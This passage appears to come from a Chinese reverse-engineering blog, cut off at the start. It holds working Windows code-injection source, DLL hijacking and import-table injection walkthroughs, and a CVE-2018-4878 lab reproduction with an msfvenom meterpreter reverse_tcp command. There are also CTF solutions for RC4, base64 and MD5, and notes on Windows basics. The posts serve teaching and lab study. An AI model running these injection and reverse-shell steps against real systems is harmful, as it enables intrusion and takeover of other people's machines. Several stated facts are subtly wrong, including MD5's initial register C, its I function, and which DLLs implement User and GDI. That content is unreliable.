(DWORD)atol(argv[1]); InjectCode(dwPID); return 0;&#125; main()函数用来调用InjectCode()函数，传入的函数参数为目标进程的PID。 2、ThreadProc()函数该函数为注入目标进程的代码（线程函数）。 123456789101112131415161718192021DWORD WINAPI ThreadProc(LPVOID lParam)&#123; PTHREAD_PARAM pParam = (PTHREAD_PARAM)lParam; HMODULE hMod = NULL; FARPROC pFunc = NULL; // LoadLibrary() hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]); // &quot;user32.dll&quot; if( !hMod ) return 1; // GetProcAddress() pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]); // &quot;MessageBoxA&quot; if( !pFunc ) return 1; // MessageBoxA() ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK); return 0;&#125; 上述代码看起来比较复杂，其实等同于 123hMod = LoadLibraryA(&quot;user32.dll&quot;);pFunc = GetProcAddress(hMod, &quot;MessageBoxA&quot;);pFunc(NULL, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, MB_OK); 从上述代码中的ThreadProc()函数可以看到，函数中并未直接调用相关API，也未直接定义用字符串，它们都是通过THREAD_PARAM结构体以线程参数的形式传递使用。原因在于编译的过程中，编译器将会把调用API的地址写死，但是在目标进程中对应的地址并不一定存在该函数，导致代码不能正常工作。因此我们通过重定义API函数，使其不依赖动态库的调用。 3、InjectCode()函数InjectCode()是代码注入的核心部分，以下是代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091BOOL InjectCode(DWORD dwPID)&#123; HMODULE hMod = NULL; THREAD_PARAM param = &#123;0,&#125;; HANDLE hProcess = NULL; HANDLE hThread = NULL; LPVOID pRemoteBuf[2] = &#123;0,&#125;; DWORD dwSize = 0; hMod = GetModuleHandleA(&quot;kernel32.dll&quot;); // set THREAD_PARAM param.pFunc[0] = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); param.pFunc[1] = GetProcAddress(hMod, &quot;GetProcAddress&quot;); strcpy_s(param.szBuf[0], &quot;user32.dll&quot;); strcpy_s(param.szBuf[1], &quot;MessageBoxA&quot;); strcpy_s(param.szBuf[2], &quot;www.reversecore.com&quot;); strcpy_s(param.szBuf[3], &quot;ReverseCore&quot;); // Open Process if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, // dwDesiredAccess FALSE, // bInheritHandle dwPID)) ) // dwProcessId &#123; printf(&quot;OpenProcess() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for THREAD_PARAM dwSize = sizeof(THREAD_PARAM); if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[0], // lpBaseAddress (LPVOID)&amp;param, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for ThreadProc() dwSize = (DWORD)InjectCode - (DWORD)ThreadProc; if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_EXECUTE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[1], // lpBaseAddress (LPVOID)ThreadProc, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !(hThread = CreateRemoteThread(hProcess, // hProcess NULL, // lpThreadAttributes 0, // dwStackSize (LPTHREAD_START_ROUTINE)pRemoteBuf[1], // dwStackSize pRemoteBuf[0], // lpParameter 0, // dwCreationFlags NULL)) ) // lpThreadId &#123; printf(&quot;CreateRemoteThread() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125; InjectCode()函数的set THREAD_PARAM部分用来设置THREAD_PARAM结构体变量，它们会注入目标进程，并且以参数形式传递给ThreadProc()线程函数。其核心API函数整理如下： 1234567891011OpenProcess()//data : THREAD_PARAMVirtualAllocEx()WriteProcessMemory()//code : ThreadProc()VirtualAllocEx()WriteProcessMemory()CreateRemoteThread() 上述代码主要用来在目标进程中分别为data和code分配内存，并将它们注入进程。最后调用CreteRemoteThread（） API，执行远程线程。 3、调试代码注入是一种向目标进程创建新线程的技术，在OD的Debugging options中将Events设置为Break on new thread。从现在开始，每当notepad.exe进程中生成新线程，调试器就暂停在线程函数开始的代码位置。]]></content>
  </entry>
  <entry>
    <title><![CDATA[输入表]]></title>
    <url>%2F2020%2F03%2F23%2F%E8%BE%93%E5%85%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[1、输入表1.1 输入表结构OriginalFirstThunk和FirstThunk相似，它们分别指向两个本质上相同的数组IMAGE_THUNK_DATA结构。它是一个指针大小的联合体（union）。每个IMAGE_THUNK_DATA元素对应于一个可执行文件输入的函数。具体如下：IMAGRE_IMPORT_BY_NAME结构仅有一个字节大小，存储了一个输入函数的相关信息，结构如下： 1.2 输入地址表OriginalFirstThunk是单独的一项，不可改写，称为INT。FirstThunk是PE装载器重写的。PE装载器首先搜索OriginalFirstThunk，如果找到，加载程序就迭代搜索数组中的每一个指针，找出每一个IMAGRE_IMPORT_NAME结构所指向的输入函数的地址。然后，加载器用真正的入口地址来替代由FirstThunk指向的IMAGE_THUNK_DATA数组里元素的值。因此该表被称为输入地址表（Import Address Table，IAT） 2、一道CTF实例（脱壳后IAT表修复）在这里我们主要讲IAT表，脱壳过程不做讲解。从图中我们可以看出该文件的IAT表是错的。打开OD，右键-&gt;查找-&gt;当前模块中的名称可以看到，该程序第一个调用的为Sleep函数，该函数在PE中的偏移位置为26A4，我们继续查找PE中出现26A4的地方，如图所示：该位置即为IID数组的位置。我们还要找到该程序加载了几个DLL，通过搜索我们可以发现，它调用了KERNEL32.dll（偏移位置27B0）、MSVCP90.dll（偏移位置24D0）、MSVCR90.dll（偏移位置2500）三个DLL。现在我们开始修复IAT表，在2000位置插入然后在空闲位置输入新的IAT表，改变的位置为2800和大小C8。程序成功运行。]]></content>
  </entry>
  <entry>
    <title><![CDATA[DLL注入方法（二）DLL劫持法]]></title>
    <url>%2F2020%2F03%2F19%2FDLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89DLL%E5%8A%AB%E6%8C%81%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、DLL劫持漏洞原理在Windows系统中，为了节省内存和实现代码重用，微软在Windows操作系统中实现了一种共享函数库的方式。这就是DLL（Dynamic Link Library），即动态链接库，这种库包含了可由多个程序同时使用的代码和数据。每个DLL都有一个入口函数（DLLMain），系统在特定环境下会调用DLLMain。在下面的事件发生时就会调用dll的入口函数： 1.进程装载DLL。 2.进程卸载DLL。 3.DLL在被装载之后创建了新线程。 4.DLL在被装载之后一个线程被终止了。windows xp sp2之后微软为了防止DLL劫持漏洞的产生，在XP SP2之后，添加了一个SafeDllSearchMode的注册表属性。注册表路径如下： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\SafeDllSearchMode当SafeDllSearchMode的值设置为1，即安全DLL搜索模式开启时，查找DLL的目录顺序如下： 1.程序所在目录 2.系统目录即 SYSTEM32 目录。 3.16位系统目录即 SYSTEM 目录。 4.Windows目录。 5.加载 DLL 时所在的当前目录。 6.PATH环境变量中列出的目录。windows 7 以上版本系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 2、下面我们结合AheadLib工具进行DLL劫持这是劫持前的运行样子： 运行AheadLib.exe，生成.cpp文件，复制下其中的代码，在VC环境中创建DLL项目，将代码粘贴上去，加入一段我们自己的代码： 1MessageBox(NULL,&quot;劫持成功!!!&quot;,TEXT(&quot;DLL Path&quot;),MB_ICONSTOP); 将原MsgDll.dll文件改名为a.dll，编译，生成的.dll文件改名为MsgDll.dll,将MsgDll.dll文件放入到notepad.exe文件目录下，点击运行，可以看到劫持成功。]]></content>
  </entry>
  <entry>
    <title><![CDATA[DLL注入方法（一）通过干预输入表处理过程加载目标DLL]]></title>
    <url>%2F2020%2F03%2F19%2FDLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89%E9%9D%99%E6%80%81%E4%BF%AE%E6%94%B9PE%E8%BE%93%E5%85%A5%E8%A1%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、静态修改PE输入表法准备工作：一个自行编写的MsgDLL.dll，导出了一个Msg()。修改对象：系统（Windows XP）自带的“记事本”程序notepad.exe。修改目标：启动notepad.exe时能够加载MsgDLL.dll。MsgDLL.dll的主要功能是在DllMain中弹出一个MessageBox来展示自己的存在，代码如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;VOID Msg();DWORD WINAPI ThreadShow(LPVOID lpParameter);void WriteLog(char *info,char *logfilename);BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; if (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123; CreateThread(NULL,0,ThreadShow,NULL,0,NULL); &#125; return TRUE;&#125;DWORD WINAPI ThreadShow(LPVOID lpParameter)&#123; char szPath[MAX_PATH]=&#123;0&#125;; char szBuf[1024]=&#123;0&#125;; GetModuleFileName(NULL,szPath,MAX_PATH); sprintf(szBuf,&quot;Dll已注入到进程 %s [Pid = %d]\n&quot;,szPath,GetCurrentProcessId()); //以三种方式显示自己的存在 //1.控制台 //fprintf((FILE*)GetStdHandle(STD_ERROR_HANDLE),&quot;%s&quot;,szBuf); printf(&quot;%s&quot;,szBuf); //2.调试器 OutputDebugString(szBuf); //3.Msgbox Sleep(800); MessageBox(NULL,szBuf,&quot;Dll Inject&quot;,MB_OK); return 0 ;&#125;void WriteLog(char *info,char *logfilename)&#123; HANDLE hFile; static char tmp[100]; DWORD dwwritten=0; static SYSTEMTIME systime; GetLocalTime(&amp;systime); sprintf(tmp,&quot;%04dd-%02d-%02d %02d:%02d:%02d &quot;,systime.wYear,systime.wMonth,systime.wDay,systime.wHour,systime.wMinute,systime.wSecond); hFile=CreateFile(logfilename,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL); if(INVALID_HANDLE_VALUE!=hFile) &#123; SetFilePointer(hFile,0,0,SEEK_END); WriteFile(hFile,tmp,lstrlen(tmp),&amp;dwwritten,NULL); WriteFile(hFile,info,lstrlen(info),&amp;dwwritten,NULL); WriteFile(hFile,&quot;\r\n&quot;,2,&amp;dwwritten,NULL); CloseHandle(hFile); &#125;&#125;//导出函数VOID Msg()&#123;&#125; （1）备份原IID结构原输入表的RVA为0x7604，它的RawOffset为0x7604 - 0x1000 + 0x400 = 0x6A04，大小为0xC8。增加一个节，将IID数组复制到空白区域，偏移量是0x10400，如图所示。 （2）在原IID区域构建新IID的OriginalFirstThunk、Name和FirstThunk结构 （3）填充新输入表项的IID结构根据刚才填充的两个结构和Name的偏移，填写新的IID项，如图所示。TimeDateStamp这一项我们没有，所以填0。 （4）修正PE文件头的信息1、修改输入表指向的位置以及大小。2、修改新区块的属性。注入成功]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-4878漏洞复现]]></title>
    <url>%2F2019%2F12%2F10%2FCVE-2018-4878%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[1、 引言2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2、影响版本Flash Player版本28.0.0.137以及之前的所有版本。3、漏洞复现4.1 漏洞复现环境Kali Linux + Windows 7 sp1 渗透机：Kali Linux 靶机：Windows 7 sp1 EXP：CVE-2018-4878.py Flash：flashplayer_activex_28.0.0.137.exe4.2 复现流程1、准备一台kali虚拟机与一台已关闭防火墙的win7虚拟机。 2、查看两台虚拟机的ip地址 Win7命令行：ipconfig： kali命令行：ifconfig： 3、在Kali Linux中使用msfvenom生成一个Python类型的Shell Code，代码如下： 1msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.36.249 lport=4444 -f python&gt;shellcode.txt lhost为Kali Linux的IP地址，lport为端口号，可以为其他。 4、生成shellcode.txt文件，打开cve-2018-4878.py文件和shellcode.txt文件，将cve-2018-4878.py中的shellcode替换为shellcode.txt中的shellcode。左图为cve-2018-4878.py中的代码，右图为shellcode.txt中的代码，将左图中的代码替换为右图中的代码，并保存更改。 5、修改cve-2018-4878.py中的文件信息，将其更改为自己存放的文件目录名，保存更改。（本人存放于文件CVE-2018-4878-master） 6、Kali Linux进入CVE-2018-4878-master路径，执行命令python cve-2018-4878.py生成exploit.swf和index2.html两个文件。 7、Kali Linux开启Apache2服务，将exploit.swf和index2.html文件复制到/var/www/html目录中。此时，Kali Linux上Web服务器启动，并且具备index2.html整个页面。只要靶机启用Flash插件并且访问该页面，则靶机可直接被控制。 8、Kali Linux在mfs5下使用handler模块开启会话监听。回弹一个tcp连接。设置kali渗透机的IP地址。设置监听端口，这个需跟上面msfvenom设置的端口一致。开启监听，等待目标上线。 9、在Windows7上 安装flash插件，使用Win7内置的IE 8浏览器访问页面：http://192.168.36.249/index2.html，页面显示如下。 10、切换到Kali Linux虚拟机，可以看到Kali Linux虚拟机上获取到了meterpreter shell，接下来可以用命令对靶机进行操作和管理。]]></content>
  </entry>
  <entry>
    <title><![CDATA[RC4算法学习]]></title>
    <url>%2F2019%2F09%2F15%2FRC4%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[算法原理RC4生成一种称为密钥流的伪随机流，它与明文通过异或操作混合，以达到加密的目的，解密时与密文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。 （1）KSA（the Key-Scheduling Algorithm）RC4首先使用密钥调度算法（KSA）完成对大小为256个字节的数组S的初始化及替换，在替换时使用密钥。其密钥长度一般取516字节，即40128位，通常不超过256位。先用0~255初始化数组S，然后使用密钥进行替换，C语言代码如下： 12345678910111213141516171819202122232425262728293031323334353637/*初始化S盒*/void InitSbox(unsigned char sbox[])&#123; for(int i = 0; i &lt; 256; i++) sbox[i] = i;&#125;/*密钥填充256数组*/void KeyExpansion(unsigned char key[], char *k, int len)&#123; if(len &lt;= 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i % len]; &#125; if(len &gt; 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i]; &#125;&#125;/*打乱S盒*/ void UpsetSbox(unsigned char sbox[], unsigned char key[])&#123; int j = 0; unsigned char temp; int n; for(int i = 0; i &lt; 256; i++) &#123; n = j + (int)sbox[i] + (int)key[i]; j = n % 256; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; &#125;&#125; （2）PRGA（the Pseudo-Random Generation Algorithm）数组S在完成初始化之后，便不再使用输入的密钥。密钥流的生成是从S[0]到S[255]的。对每个S[i]，根据当前的S的值，将S[i]与S中的另一字节置换。在S[255]完成转换后，操作仍重复执行。 12345678910111213141516171819202122/*加解密数据*/ void DataProcess(unsigned char sbox[], FILE *fp1, FILE *fp2)&#123; int i, j; i = 0; j = 0; char ch = fgetc(fp1); while(ch != EOF) &#123; i = (i + 1) % 256; int temp2 = j + (int)sbox[i]; j = temp2 % 256; unsigned char temp; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; int temp1 = (int)sbox[i] + (int)sbox[j]; int t = temp1 % 256; char k = sbox[t]; char cipherchar = ch ^ k; fputc(cipherchar, fp2); ch = fgetc(fp1); &#125;&#125;]]></content>
      <tags>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道base64算法CTF]]></title>
    <url>%2F2019%2F09%2F13%2F%E4%B8%80%E9%81%93BASE64%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95CTF%2F</url>
    <content type="text"><![CDATA[1、题目内容前两天做了道关于base64算法的题，flag为一段base64编码过后的密文，下面是这道题的链接：https://adworld.xctf.org.cn/media/task/attachments/a5c0e8322d9645468befabddfe0cb51d.exe 题目来源：XCTF社区2、解题过程这是一个exe文件，先用PEID进行查壳，没有壳，运行看看，要求你输入一个flah？拖入IDA，找到_main函数，按F5，代码如下我们可以看到一串关键字符串，逆推，字符串上方有一句for循环语句，经过异或得到下方的字符串，我用C语言写了段代码进行解密，代码如下： 12345678910#include &lt;stdio.h&gt;int main()&#123; int i; char str[50] = "you_know_how_to_remove_junk_code"; for(i = 0; str[i] != '\0'; i++) str[i] = str[i] ^ 0x25; printf("%s\n", str); return 0;&#125; 得到输出： 1\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@ 单击v13，再往前推可以发现还有两处di调用过v13，第二处的调用貌似没什么用，应该是垃圾代码，我们直接看第一次调用v13的函数，单击进入 这里是一段关键代码，再点击byte_414E40这个函数 现在可以判断使用了base64解码，所以将刚刚得到的字符串进行编码就可得到falg： 1XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=]]></content>
  </entry>
  <entry>
    <title><![CDATA[一些Windows基础知识]]></title>
    <url>%2F2019%2F09%2F13%2F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1、单位转换bit 位(指的是 0 or 1) byte 字节 1byte = 8 bit word 字 1 word = 2 byte dword (double word) 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB2、字节序大端序（Big endain） ：内存地址低位储存数据的高位， 小端序（Little endain）：内存地址高位储存数据的高位（x86是基于Intel8086处理器的小端体系结构） 3、ASCII码 4、Win APIAPI全名（Application Programming Interface 应用程序编程接口） 用于16位Windows的API（Windows1.0-Windows3.1）称作“Win16”，用于32位Windows的API（Windows 9x/NT/2000/XP/7/10）叫作“Win32”。64位WindowsAPI的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。API函数调用从Win16到Win32的转变中保持兼容，并且数量和功能上不断增强——Windows10 1.0只支持不到450个函数调用，现在已有几千个函数了。 Windows运转的核心是动态链接。Windows提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（DLL）实现。在Windows 9x 中，DLL通常位于\WINDOWS\SYSTEM子目录中。在Windows NT/2000/XP/7中，DLL通常位于系统安装目录的\SYSTEM和\SYSTEM32子目录中。 在早期，Windows的主要部分只需要在3个动态链接库中实现，它们分别代表Windows的三个主要子系统，叫做Kernel、User和GDI。 Kernel （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等； User （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等； GUI （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。 除了上述模块，Windows提供了其他DLL以支持更多功能，包括对象安全性、注册表操作（ADVAPI32.DLL）、通用控件（COMCTL32.DLL）、公共对话框（COMDLG32.DLL）、用户界面外壳（SHELL32.DLL）和网络（NETAPTI32.DLL）。5、WOW64WOW64（Windows-on-Windows64-bit）是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上。 64位的Windows，除了带有64位操作系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统文件都放在一个叫做“System32“的文件夹中，\Windows\System32文件夹中包含原生的64位映像文件。为了兼容32位操作系统，还增加了\Windows\SysWOW64文件夹，其中存储了32位的操作系统。 64位应用程序会加载System32目录下64位的kernel32.dll、user32.dll和ntdll.dll。当32位应用程序加载时，WOW64建立32位ntdll.dll所要求的启动环境，将CPU模式切换至32位，并开始执行32位加载器，就如同该进程在原生32位系统上一样。WOW64会对32位ntdll.dll的调用重定向ntdll.dll（64位），而不是发出原生的32位系统调用指令。WOW64转换到原生的64位模式，捕获于系统调用有关的参数，发出对应的原生64位系统调用。当原生的系统调用返回时，WOW64在返回32位模式之前将所有输出参数从64位转换成32位。 WOW64既不支持16位应用程序的执行（32位Windows支持16位应用程序的执行），也不支持加载32位内核模式的设备驱动。WOW64进程只能加载32位的DLL，不能加载原生的64位DLL。类似的，原生的64位进程不能加载32位的DLL。6、Windows消息机制Windows是一个消息（Message）驱动式系统。Windows消息提供在应用程序于应用程序之间、应用程序于Windows系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的相应和处理完成。 Windows系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由Windows监控。当一个事件发生时，WIindows先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的函数窗口。（1）SendMessage函数 （2）WM_COMMANFD消息 （3）WM_COMMAND消息 （4）WM_GETTEXT消息 （5）WM_QUIT消息 （6）WM_LBUTTONDOWN消息 7、虚拟内存在默认情况下，32位Windows操作系统的地址空间是在4GB以内。Win32的平坦内存模式使每个进程都拥有自己的虚拟空间。对32位进程来说，这个地址空间是4GB，因为32位指针拥有00000000h-FFFFFFFFh的任何值。此时，进程的代码和数据都放在同一地址空间中，不必区分代码段和数据段。 虚拟内存（Virtual Memory）不是真正的内存，它通过映射（Map）的方法使可用的虚拟地址（Virtual Address）达到4GB，每个应用程序可以获得2GB的虚拟地址，剩下的2GB留给操作系统自用。在Windows NT中，应用程序甚至可以获得3GB的虚拟地址。 Windows是一个分时的多任务操作系统，CPU时间在被分成一个个时间片后分配给不同的应用程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的4GB寻址空间，互不干扰。在物理内存中，操作系统和系统DLL代码需要供每个应用程序调用，所以他们在任意时刻必须被映射。用户的exe程序只在自己所属的时间片内被映射，用户dll则有选择地被映射。 实现方法和过程如下： 1、当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配2GB的虚拟地址（不是内存，只是地址）。 2、虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址（注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的）。 3、如果使用DLL，DLL也会被映射到进程的虚拟地址空间中。然后，虚拟内存管理器把每次内存访问映射到物理地址。]]></content>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows内核函数]]></title>
    <url>%2F2019%2F09%2F12%2FWindows%20%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Windows 内核函数Windows 内核部分会调用一些内核层的函数。这些函数都以固定的开始前缀，分别属于内核中不同的管理模块。通过函数名就可以大致知道这个函数所属的层次和模块。这些主要的前缀如下： * Ex：管理层。“Ex”是“Executive”的开头两个字母。 * Ke：核心层。“Ke”是“Kernel”的开头两个字母。 * HAL：硬件抽象层。“HAL”是“Hardware Abstraction Layer”的缩写。 * Ob：对象管理。“Ob”是“Object”的开头两个字母。 * MM：内存管理。“MM”是“Memory Manager”的缩写。 * Ps：进程（线程）管理。“Ps”表示“Process”。 * Se：安全管理。“Se”是“Security”的开头两个字母。 * Io：I/O管理。 * Fs：文件系统。“Fs”是“File System”的缩写。 * Cc：文件缓存管理。“Cc”表示“Cache”。 * Cm：系统配置管理。“Cm”是“Configuration Manager”的缩写。 * Pp：即插即用管理。“Pp”表示“Pnp”。 * Rtl：运行时程序库。“Rtl”是“Runtime Library”的缩写。 * Zw/Nt：对应于SSDT中的服务函数，例如与文件或者注册表相关的操作函数。 * Flt：Minifilter文件过滤驱动中调用的函数。 * Ndis：Ndis网络框架中调用的函数。]]></content>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5算法学习]]></title>
    <url>%2F2019%2F09%2F10%2FMD5%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、题目内容 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为：TASC?O3RJMV?WDJKX?ZM 。 题目来源：安恒杯 简单的MD5密码碰撞，通过对比密文e9032与加密后的数据，定位相关信息。我用Python写了一个简单的解题代码，运行后得出密文。3. 解题代码如下1234567891011121314151617181920import md5Enable = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q', 'R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8', '9',' ', '!', '"', '#', '$', '%', '&amp;', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '&gt;', '?', '@','[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k','l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '&#123;', '|', '&#125;', '~'&#125;fiveCode = ""for i in Enable: for j in Enable: for k in Enable: strToDecode = "TASC" + i + "O3RJMV" + j + "WDJKX" + k + "ZM" m1 = md5.new() m1.update(strToDecode) cipher = m1.hexdigest() fiveCode = cipher[0:5] if fiveCode == "e9032": print "密文：" + cipher 结果如下： 1密文：e9032994dabac08080091151380478a2 4、MD5算法1、算法原理 （1）数据填充 填充消息使其长度与448模512同余（即长度=448 mod 512）.也就是说，填充后的消息长度比512的倍数小64位。填充方法：附一个1在消息后面，然后用0来填充，直到消息的长度与448模512同余。至少填充1位，至多填充512位。 （2）添加长度 在上一步的结果之后附上64位的消息长度。如果填充前消息长度大于2^64，则只使用其低64位。添加填充位和消息长度之后，最终消息的长度正好是512的整数倍。 （3）初始化变量 用四个变量（A、B、C、D）来计算消息摘要。这里的A、B、C、D都是32位的寄存器。这些寄存器以下面的十六进制来初始化： A=01234567h，B=89abcdefh，C=fedcbah，D=76543210h 而且，在内存中是以低字节在前的形式储存的，格式如下： 01 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10 （4）数据处理 以512位分组为单位处理消息。首先定义4个辅助函数，每个都是以3个32为双字作为输入，输出1个32位双字。 F(X，Y，Z) = (X&amp;Y)|((~X)&amp;Z) G(X，Y，Z) = (X&amp;Z)|(Y&amp;(~Z)) H(X，Y，Z) = X^Y^Z I(X，Y，Z) = Y^X|(~Z) 注：&quot;&amp;&quot;是与操作，&quot;|&quot;是或操作，&quot;~&quot;是非操作，&quot;^&quot;是异或操作。 这四轮变换是对进入主循环的521位消息分组的16个32位字分别进行如下操作：将A、B、C、D的副本a、b、c、d中的3个经F、G、H、I运算后的结果与第4个相加，再加上32位字和一个32位字的加法常数，并将所得的值循环左移若干位，最后结果加上啊a、b、c、d其中一个，并回送至A、B、C、D，由此完成一次循环。 所用的加法常数由表T[i]来定义，其中i为1至64之中的值。T[i]等于4294967296乘以abs(sin(i))所得结果的整数部分，其中i用弧度来表示。 FF(a, b, c, d, M[j], s, ti)表示 a = b + ((a + F(b, c, d) + Mj + ti) &lt;&lt;&lt; s) GG(a, b, c, d, M[j], s, ti)表示 a = b + ((a + G(b, c, d) + Mj + ti) &lt;&lt;&lt; s) HH(a, b, c, d, M[j], s, ti)表示 a = b + ((a + H(b, c, d) + Mj + ti) &lt;&lt;&lt; s) II(a, b, c, d, M[j], s, ti)表示 a = b + ((a + I(b, c, d) + Mj + ti) &lt;&lt;&lt; s) For i = 0 to N/16-1 do For j = 0 to 15 do Set X[j] to M[i*16+j] AA=A; BB=B; CC=C; DD=D FF(a,b,c,d,M[0],7,0xd76aa478) ; FF(d,a,b,c,M[1],12,0xe8c7b756) ; FF(c,d,a,b,M[2],17,0x242070db) ; FF(b,c,d,a,M[3],22,0xc1bdceee) ; FF(a,b,c,d,M[4],7,0xf57c0faf) ; FF(d,a,b,c,M[5],12,0x4787c62a) ; FF(c,d,a,b,M[6],17,0xa8304613) ; FF(b,c,d,a,M[7],22,0xfd469501) ; 